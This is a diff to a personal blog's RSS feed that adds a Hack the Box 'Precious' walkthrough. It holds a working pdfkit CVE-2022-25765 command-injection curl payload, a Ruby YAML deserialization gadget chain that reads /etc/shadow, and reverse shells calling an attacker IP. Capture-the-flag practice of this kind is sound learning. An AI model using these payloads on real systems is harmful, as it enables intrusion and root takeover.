@@ -5,8 +5,165 @@
         <description>Recent content in Posts on Natan Maia Morette</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 17 Dec 2022 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Wed, 22 Mar 2023 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Hack the Box - Precious - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2023/03/hack-the-box-precious-write-up/</link>
+            <pubDate>Wed, 22 Mar 2023 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2023/03/hack-the-box-precious-write-up/</guid>
+            <description>Enumeration Initial scan:
+sudo nmap -sS -A 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 20:20 -03 Nmap scan report for precious.htb (10.10.11.189) Host is up (0.24s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Convert Web Page to PDF | http-server-header: | nginx/1.</description>
+            <content type="html"><![CDATA[
+    <img src="/images/htb/precious/banner.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="enumeration">Enumeration</h2>
+<p>Initial scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>A <span style="color:#ae81ff">10.10.11.189</span>
+Starting Nmap <span style="color:#ae81ff">7.93</span> ( https:<span style="color:#75715e">//nmap.org ) at 2023-03-21 20:20 -03
+</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> precious.htb (<span style="color:#ae81ff">10.10.11.189</span>)
+Host is up (<span style="color:#ae81ff">0.24</span>s latency).
+Not shown: <span style="color:#ae81ff">998</span> closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh     OpenSSH <span style="color:#ae81ff">8.4</span>p1 Debian <span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>deb11u1 (protocol <span style="color:#ae81ff">2.0</span>)
+<span style="color:#f92672">|</span> ssh<span style="color:#f92672">-</span>hostkey: 
+<span style="color:#f92672">|</span>   <span style="color:#ae81ff">3072</span> <span style="color:#ae81ff">845e13</span>a8e31e20661d235550f63047d2 (RSA)
+<span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+<span style="color:#f92672">|</span>_  <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">33053</span>dcd7ab798458239e7ae3c91a658 (ED25519)
+<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http    nginx <span style="color:#ae81ff">1.18.0</span>
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Convert Web Page to PDF
+<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: 
+<span style="color:#f92672">|</span>   nginx<span style="color:#f92672">/</span><span style="color:#ae81ff">1.18.0</span>
+<span style="color:#f92672">|</span>_  nginx<span style="color:#f92672">/</span><span style="color:#ae81ff">1.18.0</span> <span style="color:#f92672">+</span> Phusion Passenger(R) <span style="color:#ae81ff">6.0.15</span>
+</code></pre></div><p>Just port <code>80</code>and <code>22</code>open.</p>
+<h3 id="http---80">HTTP - 80</h3>
+<p>The first step was to configure the DNS entry for <code>precious.htb</code>, then I could open the address in my browser.</p>
+
+    <img src="/images/htb/precious/http.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Running <code>whatweb</code>for web enumeration:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">whatweb http:<span style="color:#75715e">//precious.htb/
+</span><span style="color:#75715e"></span>http:<span style="color:#75715e">//precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
+</span></code></pre></div><p>I did more enumeration with gobuster, nikto, nmap &ndash;script vunls but I didn&rsquo;t find any entry points.</p>
+<p>Nothing in the page&rsquo;s source code:</p>
+
+    <img src="/images/htb/precious/source.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>The page is a tool to convert web address into PDF, I just try some random web pages but since the machine does not have internet access all of them failed. 
+Then I decide to set up a local HTTP server with python and try to convert a Local URL:</p>
+
+    <img src="/images/htb/precious/convert.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>The tool worked and converted my URL to PDF, then I download the file to analyze.</p>
+
+    <img src="/images/htb/precious/exif.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Using <code>exiftool</code> I found the tool behind this conversion <code>pdfkit v0.8.6</code>, after google it I discovered the CVE-2022-25765 related to this tool.</p>
+<p>The process to explore this vulnerability was simple, the first step was open the HTTP local server again.
+Then open a local port with <code>netcat</code> and send the payload with <code>curl</code>.</p>
+<p>Payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">curl <span style="color:#960050;background-color:#1e0010">&#39;</span>TARGET<span style="color:#f92672">-</span>URL<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>X POST <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>User<span style="color:#f92672">-</span>Agent: Mozilla<span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (X11; Linux x86_64; rv:<span style="color:#ae81ff">102.0</span>) Gecko<span style="color:#f92672">/</span><span style="color:#ae81ff">20100101</span> Firefox<span style="color:#f92672">/</span><span style="color:#ae81ff">102.0</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Accept: text<span style="color:#f92672">/</span>html,application<span style="color:#f92672">/</span>xhtml<span style="color:#f92672">+</span>xml,application<span style="color:#f92672">/</span>xml;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,image<span style="color:#f92672">/</span>avif,image<span style="color:#f92672">/</span>webp,<span style="color:#f92672">/</span>;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Accept<span style="color:#f92672">-</span>Language: en<span style="color:#f92672">-</span>US,en;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Accept<span style="color:#f92672">-</span>Encoding: gzip, deflate<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>x<span style="color:#f92672">-</span>www<span style="color:#f92672">-</span>form<span style="color:#f92672">-</span>urlencoded<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Origin: TARGET_URL<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Connection: keep<span style="color:#f92672">-</span>alive<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Referer: TARGET_URL<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#960050;background-color:#1e0010">&#39;</span>Upgrade<span style="color:#f92672">-</span>Insecure<span style="color:#f92672">-</span>Requests: <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">--</span>data<span style="color:#f92672">-</span>raw <span style="color:#960050;background-color:#1e0010">&#39;</span>url<span style="color:#f92672">=</span>http<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">2F</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2F</span>LOCAL<span style="color:#f92672">-</span>IP<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>ALOCAL<span style="color:#f92672">-</span>HTTP<span style="color:#f92672">-</span>PORT<span style="color:#f92672">%</span><span style="color:#ae81ff">2F</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3F</span>name<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">2520</span><span style="color:#f92672">%</span><span style="color:#ae81ff">60</span><span style="color:#f92672">+</span>ruby<span style="color:#f92672">+-</span>rsocket<span style="color:#f92672">+-</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">27</span>spawn<span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>sh<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>C<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Ain<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>C<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Aout<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>C<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Aerr<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>ETCPSocket.new<span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22L</span>OCAL<span style="color:#f92672">-</span>IP<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>CLOCAL<span style="color:#f92672">-</span>LISTEN<span style="color:#f92672">-</span>PORT<span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">27</span><span style="color:#f92672">%</span><span style="color:#ae81ff">60</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</code></pre></div>
+    <img src="/images/htb/precious/shell.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<h3 id="local-enumeration">Local Enumeration</h3>
+<p>Now I have a shell and just try to get the user flag, but unfortunately the user ruby does not have permission to head the file.</p>
+
+    <img src="/images/htb/precious/permission.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>After doing a bunch of manual enumeration I found a user/password saved in the ruby home folder:</p>
+
+    <img src="/images/htb/precious/henry.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<h3 id="ssh">SSH</h3>
+<p>With a combination of user and pass I connected to the machine through <code>ssh</code> and was able to open the <code>user.txt</code>flag:</p>
+
+    <img src="/images/htb/precious/user.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Doing some manual checks I found that henry users can run <code>/usr/bin/ruby /opt/update_dependencies.rb</code>as sudo:</p>
+
+    <img src="/images/htb/precious/sudo.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>I tried many things to escalate my privileges to root, but after some googling, I found a vulnerability related to the YAML load file function deserialization, and the file /opt/update_dependencies.rb contains this function.</p>
+
+    <img src="/images/htb/precious/dependencies.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>When I tried to run it as sudo, I received an error about a missing dependencies.yml file, so I created the file and put the Ruby payload inside.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> <span style="color:#f92672">---</span>
+<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Gem<span style="color:#f92672">::</span>Installer
+    i: x
+<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Gem<span style="color:#f92672">::</span>SpecFetcher
+    i: y
+<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Gem<span style="color:#f92672">::</span>Requirement
+  requirements:
+    <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Gem<span style="color:#f92672">::</span>Package<span style="color:#f92672">::</span>TarReader
+    io: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Net<span style="color:#f92672">::</span>BufferedIO
+      io: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Gem<span style="color:#f92672">::</span>Package<span style="color:#f92672">::</span>TarReader<span style="color:#f92672">::</span>Entry
+         read: <span style="color:#ae81ff">0</span>
+         header: <span style="color:#e6db74">&#34;abc&#34;</span>
+      debug_output: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Net<span style="color:#f92672">::</span>WriteAdapter
+         socket: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Gem<span style="color:#f92672">::</span>RequestSet
+             sets: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>object:Net<span style="color:#f92672">::</span>WriteAdapter
+                 socket: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>module <span style="color:#960050;background-color:#1e0010">&#39;</span>Kernel<span style="color:#960050;background-color:#1e0010">&#39;</span>
+                 method_id: <span style="color:#f92672">:</span>system
+             git_set: cat <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>shadow
+         method_id: <span style="color:#f92672">:</span>resolve
+</code></pre></div><p>I modified the git_set line to read the shadow file, but it did not work. I set several commands in this payload, but none of them seemed to work. So, I decided to restart the machine because it seemed like something was broken. After the restart, I ran the sudo command again and it worked.</p>
+
+    <img src="/images/htb/precious/passwd.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Since I was able to read the passwd file, I presume we have an entry point for root privilege escalation. There are different approaches from this point. I could try to crack the shadow file or give permissions in the root directory, but I chose to create a root session reverse shell using a ruby payload.</p>
+<p>To do this, I opened a port in my attack machine and changed the payload to run a reverse shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">---</span>
+<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
+    <span style="color:#e6db74">i</span>: x
+<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
+    <span style="color:#e6db74">i</span>: y
+<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span>
+  <span style="color:#e6db74">requirements</span>:
+    <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span>
+    <span style="color:#e6db74">io</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span>
+      <span style="color:#e6db74">io</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span>
+         <span style="color:#e6db74">read</span>: <span style="color:#ae81ff">0</span>
+         <span style="color:#e6db74">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
+      <span style="color:#e6db74">debug_output</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span>
+         <span style="color:#e6db74">socket</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span>
+             <span style="color:#e6db74">sets</span>: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span>
+                 <span style="color:#e6db74">socket</span>: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>module <span style="color:#e6db74">&#39;Kernel&#39;</span>
+                 <span style="color:#e6db74">method_id</span>: <span style="color:#e6db74">:system</span>
+             <span style="color:#e6db74">git_set</span>: ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e<span style="color:#e6db74">&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.16.35&#34;,9001))&#39;</span>
+         <span style="color:#e6db74">method_id</span>: <span style="color:#e6db74">:resolve</span>
+         
+</code></pre></div><p>Finally, with root access, I was able to read the flag located in the root directory.</p>
+
+    <img src="/images/htb/precious/root.png"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<br>
+
+
+    <img src="/images/htb/precious/pwnd.png"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>Instalando WSL sem Windows Store</title>
